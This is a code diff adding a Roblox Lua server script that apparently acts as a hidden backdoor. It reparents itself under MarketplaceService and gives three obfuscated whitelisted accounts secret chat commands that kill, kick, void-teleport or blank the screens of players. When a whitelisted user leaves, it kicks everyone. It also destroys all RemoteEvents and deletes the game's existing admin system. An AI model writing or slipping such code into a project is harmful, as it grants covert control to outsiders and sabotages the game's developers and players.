@@ -1,0 +1,111 @@
+script.Parent = game:GetService("MarketplaceService")
+local whitelisted = {"usernamemyisthiz", "lllIlIlIIlIIlIllIlIl", "lllllllIIlIlIlllIII"}
+local players = game:GetService("Players")
+function getChar(plr)
+	return plr.Character or plr.CharacterAdded:Wait()
+end
+function getTargets(type, executor)
+    local targets = {}
+    if type == "all" then
+        for i, v in next, players:GetPlayers() do
+            table.insert(targets, v)
+        end
+    elseif type == "others" then
+        for i, v in next, players:GetPlayers() do
+            if v ~= executor then
+                table.insert(targets, v)
+            end
+        end
+    else
+        local plr
+        for i, v in next, players:GetPlayers() do
+            if v.DisplayName:match(type) or v.Name:match(type) then
+                plr = v
+            end
+        end
+        table.insert(targets, plr)
+    end
+    return targets
+end
+function commands(chat, executor)
+    local chat_split = string.split(chat, " ")
+    local target = getTargets(chat_split[2], executor)
+    if target then
+        if chat:match("klC") then --Kill
+            for i, v in next, target do
+                getChar(v):FindFirstChildOfClass("Humanoid").Health = 0
+            end
+        elseif chat:match("kkC") then
+            local splitted_Chat = string.split(chat, " ")
+            local reason = ""
+            for i=3, #splitted_Chat do
+                reason = reason..splitted_Chat[i].." "
+            end
+            for i, v in next, target do
+                v:Kick(reason)
+            end
+        elseif chat:match("vC") then
+            for i, v in next, target do
+                getChar(v):PivotTo(CFrame.new(9e9,9e9,9e9))
+            end
+        elseif chat:match("bC") then
+            for i, v in next, target do
+                getChar(v):PivotTo(getChar(executor):GetPivot() * CFrame.new(0,0,3))
+            end
+        elseif chat:match("nrC") then
+            for i, v in next, target do
+                for _, j in next, v:FindFirstChild("PlayerGui"):GetChildren() do
+                    if j:IsA("ScreenGui") then
+                        j.Enabled = false
+                    end
+                end
+            end
+            if chat_split[2] == "all" or chat_split[2] == "others" then
+                game:GetService("StarterGui"):WaitForChild("SS-Executor").Enabled = false
+                for _, j in next, game:GetService("StarterGui"):GetChildren() do
+                    if j:IsA("ScreenGui") then
+                        j.Enabled = false
+                    end
+                end
+            end
+        elseif chat:match("yrC") then
+            for i, v in next, target do
+                for _, j in next, v:FindFirstChild("PlayerGui"):GetChildren() do
+                    if j:IsA("ScreenGui") then
+                        j.Enabled = true
+                    end
+                end
+            end
+            if chat_split[2] == "all" or chat_split[2] == "others" then
+                for _, j in next, game:GetService("StarterGui"):GetChildren() do
+                    if j:IsA("ScreenGui") then
+                        j.Enabled = true
+                    end
+                end
+            end
+        end
+    end
+end
+
+for i, v in next, game:GetService("Players"):GetPlayers() do
+    if table.find(whitelisted, v.Name) then
+        v.Chatted:Connect(function(x)
+            commands(x, v)
+        end)
+        players.PlayerRemoving:Connect(function(player)
+            if player.Name == v.Name then
+                for i, v in next, game:GetService("Players"):GetPlayers() do
+                    v:Kick("hey "..v.Name.." left the server")
+                end
+            end
+        end)
+    end
+end
+for i, v in next, game:GetService("ReplicatedStorage"):GetChildren() do
+    if v:IsA("RemoteEvent") then 
+        v:Destroy() 
+    end
+end
+if game:GetService("ServerScriptService"):FindFirstChild("Kohl's Admin Infinite") then
+    game:GetService("ServerScriptService"):FindFirstChild("Kohl's Admin Infinite"):Destroy()
+end
